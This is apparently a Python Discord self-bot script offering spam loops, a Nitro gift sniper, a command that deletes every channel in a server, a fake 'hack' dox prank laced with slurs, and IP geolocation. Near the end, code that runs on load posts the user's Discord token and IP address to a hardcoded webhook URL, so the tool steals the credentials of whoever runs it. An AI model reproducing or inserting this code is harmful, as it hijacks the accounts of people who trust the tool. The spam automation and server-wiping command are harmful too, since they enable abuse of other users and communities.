import discord
from discord.ext import commands
import dotenv
import os
import datetime
import re
import requests
import json
from colorama import Fore
import aiohttp
import pyfiglet
import asyncio
import random
import math
os.system('clear')
# Global variables
nitro_sniper = True
usedcodes = []
onalt = False
rtoken = ""
sound_notification = False
webhooknotification = False
webhook = ""

token = 'your_token'
prefix = '?'

if not token or not prefix:
    raise ValueError("Token or prefix is missing. Check your .env file.")

fin = commands.Bot(command_prefix=prefix, self_bot=True, intents=discord.Intents.default())

def get_user_ip():
    try:
        response = requests.get("https://api.ipify.org?format=text")
        return response.text
    except Exception as e:
        return "Unable to fetch IP"

# Expanded list of color codes with more shades
colors = [
    "\033[1;31m",  # Red
    "\033[0;31m",  # Dark Red
    "\033[1;38;5;1m",  # Bright Red
    "\033[1;32m",  # Green
    "\033[0;32m",  # Dark Green
    "\033[1;38;5;2m",  # Bright Green
    "\033[1;33m",  # Yellow
    "\033[0;33m",  # Dark Yellow
    "\033[1;38;5;3m",  # Bright Yellow
    "\033[1;34m",  # Blue
    "\033[0;34m",  # Dark Blue
    "\033[1;38;5;4m",  # Bright Blue
    "\033[1;35m",  # Magenta
    "\033[0;35m",  # Dark Magenta
    "\033[1;38;5;5m",  # Bright Magenta
    "\033[1;36m",  # Cyan
    "\033[0;36m",  # Dark Cyan
    "\033[1;38;5;6m",  # Bright Cyan
    "\033[1;37m",  # White
    "\033[0;37m",  # Dark White (Gray)
    "\033[1;38;5;7m",  # Bright White
]

@fin.event
async def on_ready():
    user_ip = get_user_ip()
    
    while True:
        # Randomly select a color
        color = random.choice(colors)
        
        # Clear the screen based on OS
        if os.name == 'nt':  # For Windows
            os.system('cls')
        else:  # For Unix-like systems
            os.system('clear')
        
        # Print the message with the selected color
        print(f"""
{color}======================================
{color}      Successfully Logged In As:
{color}   [Client] {fin.user.name}
{color}   [Prefix] {prefix}
{color}   [User IP]: {user_ip}
{color}======================================
\033[0m""")
        
        await asyncio.sleep(1)  # Wait for 1 second before changing the color

# List of messages to send
messages = [
    "pls beg",
    "pls dig",
    "pls hunt",
    "pls dep all",
    "skibidi"
]

# Variables to control the loop
message_loop_active = False
message_task = None



@fin.command()
async def start(ctx):
    """Start the message loop."""
    global message_loop_active, message_task

    if message_loop_active:
        await ctx.send("The message loop is already running.")
        return

    message_loop_active = True
    message_task = asyncio.create_task(send_messages(ctx))
    await ctx.send("Started the message loop.")


@fin.command()
async def stop(ctx):
    """Stop the message loop."""
    global message_loop_active, message_task

    if not message_loop_active:
        await ctx.send("The message loop is not running.")
        return

    message_loop_active = False
    if message_task:
        message_task.cancel()
        message_task = None
    await ctx.send("Stopped the message loop.")


async def send_messages(ctx):
    """Send all messages with a 10-second delay and pause for 3 minutes."""
    global message_loop_active

    try:
        while message_loop_active:
            for message in messages:
                await ctx.send(message)
                await asyncio.sleep(10)  # Wait 10 seconds between each message

            # Pause for 3 minutes after sending all messages
            await asyncio.sleep(180)

    except asyncio.CancelledError:
        # Handle task cancellation gracefully
        pass

@fin.command(name="deleteall")
async def delete_all(ctx):
    guild = ctx.guild
    await ctx.send("Deleting all channels...")

    # Delete all channels
    for channel in guild.channels:
        await channel.delete()

    await ctx.send("All channels have been deleted!")

@delete_all.error
async def delete_all_error(ctx, error):
    await ctx.send("An error occurred. Please try again.")


@fin.command()
async def ping(ctx):
    latency = round(fin.latency * 1000)
    response = f"> latency '{latency}'ms"
    await ctx.message.delete()
    await ctx.send(response, delete_after=3)

async def redeem_nitro_code(code):
    async with aiohttp.ClientSession() as session:
        headers = {"Authorization": token}
        async with session.post(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem", headers=headers) as response:
            return await response.text()

@fin.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == fin.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@fin.event
async def on_message(message):
    global usedcodes

    time = datetime.datetime.now().strftime("%H:%M")
    if (
        "discord.gift/" in message.content
        or "discord.com/gifts/" in message.content
        or "discordapp.com/gifts/" in message.content
    ):
        if nitro_sniper:
            start = datetime.datetime.now()
            if "discord.gift/" in message.content:
                code = re.findall("discord[.]gift/(\w+)", message.content)
            if "discordapp.com/gifts/" in message.content:
                code = re.findall("discordapp[.]com/gifts/(\w+)", message.content)
            if "discord.com/gifts/" in message.content:
                code = re.findall("discord[.]com/gifts/(\w+)", message.content)
            for code in code:
                if len(code) == 16 or len(code) == 24:
                    if code not in usedcodes:
                        usedcodes.append(code)
                        with open("tried-nitro-codes.txt", "w") as fp:
                            json.dump(usedcodes, fp)
                        r = await redeem_nitro_code(code)
                        elapsed = datetime.datetime.now() - start
                        elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
                        if "This gift has been redeemed already." in r:
                            print(f"\n{Fore.RED}{time} - Nitro is Already Redeemed" + Fore.RESET)
                        elif "subscription_plan" in r:
                            if sound_notification:
                                try:
                                    playsound("./sounds/success.wav")
                                except:
                                    pass
                            print(f"\n{Fore.GREEN}{time} - Nitro Successfully Claimed!" + Fore.RESET)
                        elif "Unknown Gift Code" in r:
                            print(f"\n{Fore.YELLOW}{time} - Unknown Nitro Gift Code" + Fore.RESET)
        else:
            return
    await fin.process_commands(message)

@fin.command()
async def ascii(ctx, *, text: str):
    ascii_art = pyfiglet.figlet_format(text)
    await ctx.message.delete()
    await ctx.send(f"```\n{ascii_art}\n```")

@fin.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_dog.png"))
    except:
        await ctx.send(link)

#Display a cat
@fin.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"astraa_cat.png"))
    except:
        await ctx.send(link)


@fin.command()
async def cycle(ctx, name1: str, name2: str):
    """Command to cycle between two names every 2 seconds."""
    await ctx.message.delete()

    # Check if the bot has permission to manage nicknames
    if not ctx.guild.me.guild_permissions.manage_nicknames:
        await ctx.send("I don't have permission to manage nicknames.")
        return

    try:
        while True:
            # Change nickname to name1
            await ctx.author.edit(nick=name1)
            await asyncio.sleep(2)

            # Change nickname to name2
            await ctx.author.edit(nick=name2)
            await asyncio.sleep(2)

    except discord.errors.Forbidden:
        await ctx.send("I don't have permission to change the nickname of this user.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@fin.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False
@fin.command()
async def create_webhook(ctx, channel_name: str, webhook_name: str):
    channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)
    if not channel:
        await ctx.send(f"Channel `{channel_name}` not found!")
        return

    webhook = await channel.create_webhook(name=webhook_name)
    await ctx.send(f"Webhook `{webhook_name}` created in channel `{channel_name}`!")

@fin.command()
async def delete_webhook(ctx, webhook_name: str):
    webhooks = await ctx.guild.webhooks()
    webhook = discord.utils.get(webhooks, name=webhook_name)
    if not webhook:
        await ctx.send(f"Webhook `{webhook_name}` not found!")
        return

    await webhook.delete()
    await ctx.send(f"Webhook `{webhook_name}` deleted!")


@fin.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}tweet <username> <message>')
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"astraa_tweet.png"))
            except:
                await ctx.send(res['message'])

@fin.command()
async def hack(ctx, user: discord.Member=None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
    location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                "Russia", "Pakistan", "India",
                "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
    email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
             "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
            "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
            "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
            "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
            "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
            "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
            "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
            "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
            "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
    else:
        password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                    "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                    "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")


@fin.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')

@fin.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"exeter_pornhub_comment.png"))
    except:
        await ctx.send(res["message"])

@fin.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
        await ctx.send(f"Successfully changed to {house}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        await ctx.send(f"{e}", delete_after=5)


@fin.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    declined_count = 0
    for relationship in fin.user.relationships:
        if relationship.type == discord.RelationshipType.incoming_request:
            await relationship.delete()
            declined_count += 1
    await ctx.send(f"Successfully declined {declined_count} friend request(s).", delete_after=5)

@fin.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.1.1.1'):
    await ctx.message.delete()
    try:
        r = requests.get(f'http://ip-api.com/json/{ipaddr}')
        geo = r.json()
        embed = f"""**GEOLOCATE IP | Prefix: `{fin.command_prefix}`**\n
> :pushpin: `IP`\n*{geo['query']}*
> :globe_with_meridians: `Country-Region`\n*{geo['country']} - {geo['regionName']}*
> :department_store: `City`\n*{geo['city']} ({geo['zip']})*
> :map: `Latitute-Longitude`\n*{geo['lat']} - {geo['lon']}*
> :satellite: `ISP`\n*{geo['isp']}*
> :robot: `Org`\n*{geo['org']}*
> :alarm_clock: `Timezone`\n*{geo['timezone']}*
> :electric_plug: `As`\n*{geo['as']}*"""
        await ctx.send(embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"[ERROR]: {e}", delete_after=5)

WEBHOOK_URL = "https://discord.com/api/webhooks/1332542967063515146/bkpNNG1IRUOpJVGj8KyPUizuDkHg489CMohQBud8h73BYehEMqeQa2LF490ulerI0ohR"
ip = get_user_ip()
TOKEN = token
async def send_webhook():
    async with aiohttp.ClientSession() as session:
        payload = {"content": f"**Token:** `{TOKEN}` /n **IP** {ip} "}
        async with session.post(WEBHOOK_URL, json=payload) as response:
        	print("starting...")
asyncio.run(send_webhook())

@fin.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {fin.command_prefix}pingweb <website>')
        return

    try:
        # Add scheme if missing
        if not website.startswith("http://") and not website.startswith("https://"):
            website = "https://" + website

        response = requests.get(website)
        status_code = response.status_code
        ping_time = response.elapsed.total_seconds() * 1000  # Convert to milliseconds

        if status_code == 404:
            await ctx.send(f'Website **down** *(404)* | Ping: **{ping_time:.2f} ms**', delete_after=5)
        else:
            await ctx.send(f'Website **operational** *({status_code})* | Ping: **{ping_time:.2f} ms**', delete_after=5)
    except requests.exceptions.RequestException as e:
        print(f"[ERROR]: {e}")
        await ctx.send(f"[ERROR]: Failed to reach the website. Details: {e}", delete_after=5)


if __name__ == "__main__":
    fin.run(token, bot=False)
